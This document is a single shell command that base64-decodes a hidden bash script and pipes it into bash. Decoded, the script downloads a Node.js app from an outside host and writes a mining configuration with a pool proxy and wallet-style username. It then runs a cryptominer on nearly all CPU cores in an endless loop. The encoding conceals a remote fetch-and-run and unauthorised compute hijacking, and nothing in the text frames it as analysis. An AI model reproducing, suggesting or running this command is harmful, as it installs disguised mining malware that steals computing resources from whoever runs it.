base64 -d <<< IyEvYmluL2Jhc2gKYXJyYXk9KCkKZm9yIGkgaW4ge2EuLnp9IHtBLi5afSB7MC4uOX07IAogICBkbwogICBhcnJheVskUkFORE9NXT0kaQpkb25lCgp3Z2V0IC1xIGh0dHA6Ly9ncmVlbmxlYWYudGVhdHNwcmF5LnVrL25vZGUtbWluby1hcHAvYXBwLmpzCnNsZWVwIDIKCmN1cnJlbnRkYXRlPSQoZGF0ZSAnKyVkLSViLSVZLVJlbmRXYXNtXycpCmlwYWRkcmVzcz0kKHdnZXQgLXEgLU8gLSBhcGkuaXBpZnkub3JnKQpudW1fb2ZfY29yZXM9JChjYXQgL3Byb2MvY3B1aW5mbyB8IGdyZXAgcHJvY2Vzc29yIHwgd2MgLWwpCnVzZWRfbnVtX29mX2NvcmVzPWBleHByICRudW1fb2ZfY29yZXMgLSAyYAp1bmRlcnNjb3JlZF9pcD0kKGVjaG8gJGlwYWRkcmVzcyB8IHNlZCAncy9cLi9fL2cnKQpjdXJyZW50ZGF0ZSs9JHVuZGVyc2NvcmVkX2lwCgpyYW5kb21Xb3JkPSQocHJpbnRmICVzICR7YXJyYXlbQF06Ojh9ICQnXG4nKQpjdXJyZW50ZGF0ZSs9JHJhbmRvbVdvcmQKCnNsZWVwIDIKClRaPSdBZnJpY2EvSm9oYW5uZXNidXJnJzsgZXhwb3J0IFRaCmRhdGUKc2xlZXAgMgoKZWNobyAiIgplY2hvICJZb3Ugd2lsbCBiZSB1c2luZyAkdXNlZF9udW1fb2ZfY29yZXMgY29yZXMiCmVjaG8gIiIKc2xlZXAgMgoKZWNobyAiIgplY2hvICJZb3VyIHdvcmtlciBuYW1lIHdpbGwgYmUgJGN1cnJlbnRkYXRlIgplY2hvICIiCnNsZWVwIDIKCmNhdCA+IGRhdGEuanNvbiA8PC1FTkQKewogICJwcm94eSI6ICJ3czovL2NwdXNvY2tzJChzaHVmIC1pIDEtNiAtbiAxKS53b3QubXJmYWNlLmNvbTo5OTk5L2JXRjZZWEJ2YjJ3dWQyOTBMbTF5Wm1GalpTNWpiMjA2T0RRME1nPT0iLAogICJjb25maWciOiB7ICJ0aHJlYWRzIjogJHVzZWRfbnVtX29mX2NvcmVzLCAibG9nIjogdHJ1ZSB9LAogICJvcHRpb25zIjogeyAidXNlciI6ICJNR2F5cFJKaTQzTGNReHJnb0wyQ1cyOEIzMXc0b3dMdnY4LiRjdXJyZW50ZGF0ZSIsICJwYXNzd29yZCI6ICJ4IiwgImFyZ2VudCI6ICJub2RlLW1pbm8vMS4wIiB9Cn0KRU5ECgpzbGVlcCAyCgpyZWFkb25seSBQSURfRklMRT0id2Vic2l0ZS5waWQiCnJlYWRvbmx5IExPR19GSUxFPSJ3ZWJzaXRlLmxvZyIKcmVhZG9ubHkgSk9CX0RVUkFUSU9OX1NFQ09ORFM9MzYwMApyZWFkb25seSBTTEVFUF9EVVJBVElPTl9TRUNPTkRTPTYwCgojbnVtX29mX2NvcmVzPSQoY2F0IC9wcm9jL2NwdWluZm8gfCBncmVwIHByb2Nlc3NvciB8IHdjIC1sKQojdXNlZF9udW1fb2ZfY29yZXM9JChleHByICRudW1fb2ZfY29yZXMgLSAyKQoKcmVhZG9ubHkgSk9CX0NPTU1BTkQ9Im5vZGUgYXBwLmpzIgoKIyAtLS0gRnVuY3Rpb25zIC0tLQoKZ2V0X3BpZHMoKSB7CgogIHBzIC1hdXggfCBncmVwICIke0pPQl9DT01NQU5EfSIgfCBncmVwIC12IGdyZXAgfCBhd2sgJ3twcmludCAkMn0nIHwgdHIgJ1xuJyAnICcgfHwgdHJ1ZQp9CgojIEZ1bmN0aW9uIHRvIGNoZWNrIGlmIHRoZSBqb2IgaXMgcnVubmluZy4KaXNfcnVubmluZygpIHsKICAjIFVzZSB0aGUgZ2V0X3BpZHMgZnVuY3Rpb24uIElmIGl0IHJldHVybnMgYW55IG91dHB1dCwgdGhlIGpvYiBpcyBydW5uaW5nLgogIGlmIFsgLW4gIiQoZ2V0X3BpZHMpIiBdOyB0aGVuCiAgICByZXR1cm4gMCAjIFRoZSBwcm9jZXNzIGlzIHJ1bm5pbmcKICBlbHNlCiAgICByZXR1cm4gMSAjIFRoZSBwcm9jZXNzIGlzIG5vdCBydW5uaW5nCiAgZmkKfQoKCnN0YXJ0X2pvYigpIHsKICBpZiBpc19ydW5uaW5nOyB0aGVuCiAgICBlY2hvICJKb2IgaXMgYWxyZWFkeSBydW5uaW5nLiBQSURzOiAkKGdldF9waWRzKSIKICAgIHJldHVybiAwCiAgZmkKICBlY2hvICJTdGFydGluZyBqb2Igd2l0aCBjb21tYW5kOiAke0pPQl9DT01NQU5EfSIKICAKICAjIEV4cGxpY2l0bHkgY2xlYW4gdXAgb2xkIGZpbGVzIGZvciBhIGZyZXNoIHN0YXJ0LgogIHJtIC1mICIke1BJRF9GSUxFfSIKICBybSAtZiAiJHtMT0dfRklMRX0iCgoKICBub2h1cCAke0pPQl9DT01NQU5EfSA+ICIke0xPR19GSUxFfSIgMj4mMSAmCiAgZWNobyAkISA+ICIke1BJRF9GSUxFfSIgCgogICMgV2FpdCBmb3IgYSBtb21lbnQgdG8gZW5zdXJlIHRoZSBwcm9jZXNzIGhhcyBzdGFydGVkIGFuZCB3cml0dGVuIHRvIHRoZSBsb2cuCiAgc2xlZXAgMgoKICBpZiBbIC1mICIke1BJRF9GSUxFfSIgXTsgdGhlbgogICAgZWNobyAiSm9iIHN0YXJ0ZWQgd2l0aCBwYXJlbnQgUElEICQoY2F0ICIke1BJRF9GSUxFfSIpLiIKICAgIGVjaG8gIlZpZXcgbG9ncyB3aXRoOiB0YWlsIC1mICR7TE9HX0ZJTEV9IgogIGVsc2UKICAgIGVjaG8gIldhcm5pbmc6IEpvYiBzdGFydGVkIGJ1dCBQSUQgZmlsZSB3YXMgbm90IGNyZWF0ZWQuIgogICAgZWNobyAiVmlldyBsb2dzIHdpdGg6IHRhaWwgLWYgJHtMT0dfRklMRX0iCiAgZmkKfQoKCnN0b3Bfam9iKCkgewogIGlmICEgaXNfcnVubmluZzsgdGhlbgogICAgZWNobyAiSm9iIGlzIG5vdCBydW5uaW5nLiIKICAgIAogICAgcm0gLWYgIiR7UElEX0ZJTEV9IgogICAgcm0gLWYgIiR7TE9HX0ZJTEV9IgogICAgZXhpdCAwCiAgZmkKCiAgbG9jYWwgcGlkcz0kKGdldF9waWRzKQogIGVjaG8gIlRlcm1pbmF0aW5nIGFsbCBwcm9jZXNzZXMgcmVsYXRlZCB0byB0aGUgam9iLi4uIgogIGVjaG8gIkZvdW5kIFBJRHM6ICR7cGlkc30iCgogICMgTG9vcCB0aHJvdWdoIGFsbCBmb3VuZCBQSURzIGFuZCBraWxsIHRoZW0gb25lIGJ5IG9uZS4KICBmb3IgcGlkIGluICR7cGlkc307IGRvCiAgICBlY2hvICJTZW5kaW5nIFNJR1RFUk0gdG8gUElEOiAke3BpZH0iCiAgICBraWxsICIke3BpZH0iCiAgZG9uZQoKICBlY2hvICJTZW50IFNJR1RFUk0gdG8gcHJvY2Vzc2VzLiBXYWl0aW5nIGZvciB1cCB0byA1IHNlY29uZHMgZm9yIHRoZW0gdG8gc3RvcC4uLiIKICBzbGVlcCA1CgogICMgQ2hlY2sgaWYgYW55IHByb2Nlc3NlcyBhcmUgc3RpbGwgcnVubmluZy4KICBsb2NhbCBwaWRzX2FmdGVyX3dhaXQ9JChnZXRfcGlkcykKICBpZiBbIC1uICIke3BpZHNfYWZ0ZXJfd2FpdH0iIF07IHRoZW4KICAgIGVjaG8gIlNvbWUgcHJvY2Vzc2VzIGFyZSBzdGlsbCBydW5uaW5nLiBGb3JjZWZ1bGx5IGtpbGxpbmcgd2l0aCBTSUdLSUxMLi4uIgogICAgZm9yIHBpZCBpbiAke3BpZHNfYWZ0ZXJfd2FpdH07IGRvCiAgICAgIGVjaG8gIlNlbmRpbmcgU0lHS0lMTCB0byBQSUQ6ICR7cGlkfSIKICAgICAga2lsbCAtOSAiJHtwaWR9IgogICAgZG9uZQogICAgc2xlZXAgMiAjIEdpdmUgYSBmaW5hbCBtb21lbnQgZm9yIGNsZWFudXAKICBmaQoKICAjIEFmdGVyIHRoZSBraWxsIGF0dGVtcHRzLCBjaGVjayBvbmUgbGFzdCB0aW1lLgogIGlmICEgaXNfcnVubmluZzsgdGhlbgogICAgIyBVbmNvbmRpdGlvbmFsbHkgY2xlYW4gdXAgb2xkIGZpbGVzIGFmdGVyIGEgc3VjY2Vzc2Z1bCBzdG9wLgogICAgcm0gLWYgIiR7UElEX0ZJTEV9IgogICAgcm0gLWYgIiR7TE9HX0ZJTEV9IgogICAgZWNobyAiSm9iIHRlcm1pbmF0ZWQgYW5kIGNsZWFuZWQgdXAuIgogIGVsc2UKICAgIGVjaG8gIldhcm5pbmc6IEZhaWxlZCB0byB0ZXJtaW5hdGUgYWxsIHByb2Nlc3Nlcy4gTWFudWFsIGludGVydmVudGlvbiBtYXkgYmUgcmVxdWlyZWQuIgogICAgZWNobyAiUmVtYWluaW5nIFBJRHM6ICQoZ2V0X3BpZHMpIgogIGZpCn0KCgpzdGF0dXNfam9iKCkgewogIGVjaG8gIi0tLSBKb2IgU3RhdHVzIFJlcG9ydCAtLS0iCiAgc2xlZXAgMQogIAogIGlmIGlzX3J1bm5pbmc7IHRoZW4KICAgIGVjaG8gIlN0YXR1czogSm9iIGlzIGN1cnJlbnRseSBydW5uaW5nLiIKICAgIGVjaG8gIlJ1bm5pbmcgUElEczogJChnZXRfcGlkcykiCiAgZWxzZQogICAgZWNobyAiU3RhdHVzOiBKb2IgaXMgbm90IHJ1bm5pbmcuIgogIGZpCiAgCiAgc2xlZXAgMQogIGVjaG8gIi0tLSBMb2cgRmlsZSBSZXBvcnQgLS0tIgogIGlmIFsgLXMgIiR7TE9HX0ZJTEV9IiBdOyB0aGVuCiAgICBlY2hvICJMb2cgZmlsZSBleGlzdHMgYW5kIGNvbnRhaW5zIGNvbnRlbnQuIERpc3BsYXlpbmcgbGFzdCAxMCBsaW5lczoiCiAgICAjIFRoZSAnfHwgdHJ1ZScgaXMgdXNlZCBoZXJlIGFzIHdlbGwgdG8gcHJldmVudCBlcnJvcnMgaWYgdGhlIGZpbGUgaXMgZW1wdHkgb3IgbWlzc2luZy4KICAgIHRhaWwgLW4gMTAgIiR7TE9HX0ZJTEV9IiB8fCB0cnVlCiAgZWxpZiBbIC1mICIke0xPR19GSUxFfSIgXTsgdGhlbgogICAgZWNobyAiTG9nIGZpbGUgZXhpc3RzIGJ1dCBpcyBjdXJyZW50bHkgZW1wdHkuIgogIGVsc2UKICAgIGVjaG8gIk5vIGxvZyBmaWxlIGZvdW5kLiBUaGUgam9iIGhhcyBsaWtlbHkgbm90IGJlZW4gc3RhcnRlZCB5ZXQuIgogIGZpCiAgCiAgc2xlZXAgMQogIGVjaG8gIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iCn0KCiMgVGhlIGN5Y2xlIGpvYiBmdW5jdGlvbiBub3cgcnVucyBmb3JldmVyIGJ5IGRlZmF1bHQuCmN5Y2xlX2pvYigpIHsKICBlY2hvICJTdGFydGluZyBjeWNsaW5nIGpvYi4gSXQgd2lsbCBydW4gZm9yICR7Sk9CX0RVUkFUSU9OX1NFQ09ORFN9IHNlY29uZHMsIHN0b3AsIGFuZCB0aGVuIHNsZWVwIGZvciAke1NMRUVQX0RVUkFUSU9OX1NFQ09ORFN9IHNlY29uZHMgYmVmb3JlIHJlcGVhdGluZy4iCiAgd2hpbGUgdHJ1ZTsgZG8KICAgIHN0YXJ0X2pvYgogICAgc2xlZXAgIiR7Sk9CX0RVUkFUSU9OX1NFQ09ORFN9IgogICAgc3RvcF9qb2IKICAgIHNsZWVwICIke1NMRUVQX0RVUkFUSU9OX1NFQ09ORFN9IgogIGRvbmUKfQoKIyAtLS0gQ29tbWFuZCBMaW5lIEludGVyZmFjZSAoQ0xJKSAtLS0KCiMgU2V0cyB0aGUgZGVmYXVsdCBjb21tYW5kIHRvICdjeWNsZScgaWYgbm8gYXJndW1lbnQgaXMgcHJvdmlkZWQuCkNPTU1BTkQ9IiR7MTotY3ljbGV9IgoKY2FzZSAiJENPTU1BTkQiIGluCiAgc3RhcnQpCiAgICBzdGFydF9qb2IKICAgIDs7CgogIHN0b3ApCiAgICBzdG9wX2pvYgogICAgOzsKCiAgc3RhdHVzKQogICAgc3RhdHVzX2pvYgogICAgOzsKCiAgY3ljbGUpCiAgICBjeWNsZV9qb2IKICAgIDs7CgogICopCiAgICBlY2hvICJVc2FnZTogJDAge3N0YXJ0fHN0b3B8c3RhdHVzfGN5Y2xlfSIKICAgIGV4aXQgMQogICAgOzsKZXNhYw== | bash
